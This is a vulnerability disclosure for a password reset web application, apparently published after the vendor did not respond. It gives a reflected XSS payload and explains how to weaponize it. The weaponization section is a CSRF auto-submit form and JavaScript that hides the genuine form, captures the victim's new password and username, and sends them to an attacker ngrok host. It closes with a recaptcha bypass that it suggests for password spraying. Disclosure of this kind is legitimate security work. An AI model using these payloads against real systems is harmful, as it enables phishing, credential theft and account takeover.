The vendor was emailed several times to fix this, but no replies. 90 days were provided to resolve the issue from my first email.

I was unable to view the version of this application. However, here is a list of vulnerabilities for the application:

## Reflected XSS

I found 2 XSS Vulnerabilites on the following URLs:

```
PasswordReset/ChangePass/ChangeThePass
PasswordReset/Reset/Authenticate
```

You may use the following payload as a POST request to the URL to reflect the contents of the recaptcha-response. Please change the domain name to the domain you are targeting.

```
command=Next&Username=%24dc1&DomainName=xxxx.xxxx&ReCaptchaPublicKey=6LxOW5_v5AH39Tex8cBG4b57&g-recaptcha-response=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%61%6c%65%72%74%28%31%29%3e&HomeUrl=%2FPasswordReset&X-Requested-With=XMLHttpRequest
```

### Weaponization

To abuse the POST Request Reflected XSS, you may pair it with a CSRF attack.

Create a page on your domain that you control with the following contents:
- Note: Change the form action URL to the target, and DomainName variable.

```js
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://victim.com/PasswordReset/Reset/Authenticate" method="POST">
      <input type="hidden" name="command" value="Next" />
      <input type="hidden" name="Username" value="&#36;dc1" />
      <input type="hidden" name="DomainName" value="ad&#46;&#46;" />
      <input type="hidden" name="ReCaptchaPublicKey" value="6LcgSVkaAAdOW5&#95;v5A19Tgfx68cB5b57" />
      <input type="hidden" name="g&#45;recaptcha&#45;response" value="<PAYLOAD>" />
      <input type="hidden" name="HomeUrl" value="&#47;PasswordReset" />
      <input type="hidden" name="X&#45;Requested&#45;With" value="XMLHttpRequest" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Anything in the Recaptcha response gets reflected. So you will send a phishing link to your victim to your website, redirecting the post request to the website, thus running javascript on the victim's browser.

I will leave it up to your imagination to do what you'd like with your payload. In my engagement, I wrote a proof of concept and created my own reset form while hiding the real one, coercing the user to reset their password. You may improve it by resetting the password and send the data to your server. I only sent the data to my server as proof of concept.

As noted, use `<script this.src="">` to remotely load your javascript, there is a character limit in the reflection, so you must load it remotely.

```js
//First we will want to remove the Server error so the user doesn't get suspicious. Also, make sure to </div> before script. We can remote load our javascript with <script this.src=""> so we'll do that.

<script>
const serverErrorElement = document.getElementById('serverError');
if (serverErrorElement) {
  serverErrorElement.remove();
}
const onElements = document.querySelectorAll('.on');
onElements.forEach((element) => {
  element.remove();
});
const offElements = document.querySelectorAll('.off');
offElements.forEach((element) => {
  element.remove();
});
const arrowImage = document.querySelector('img[src="/PasswordReset/Content/Images/arrow.svg"]');
if (arrowImage) {
  arrowImage.remove();
}

const nextButton = document.querySelector('button[value="Next"]');

// Add an event listener to the 'Next' button
nextButton.addEventListener('click', async (event) => {
  // Prevent the default button click behavior
  event.preventDefault();

// Get the values of the ConfirmPassword and Username fields
  const confirmPassword = document.getElementById('ConfirmPassword').value;
  const username = document.getElementById('Username').value;

  // Create the URL with the ConfirmPassword and Username values as parameters
  const url = `https://aaaaaa.ngrok.io/index.php?ConfirmPassword=${encodeURIComponent(confirmPassword)}&Username=${encodeURIComponent(username)}`;

  // Redirect to the other site's endpoint
  window.location.href = url;
});</script>
```

## Recaptcha Bypass

Create a Login request, and capture it in Burpsuite. Change the password or username in the post request and re-send it. Additionally, you may change the re-captcha response to whatever you'd like, meaning the server doesn't actually check it. This is great for password spraying once you've done username enumeration.
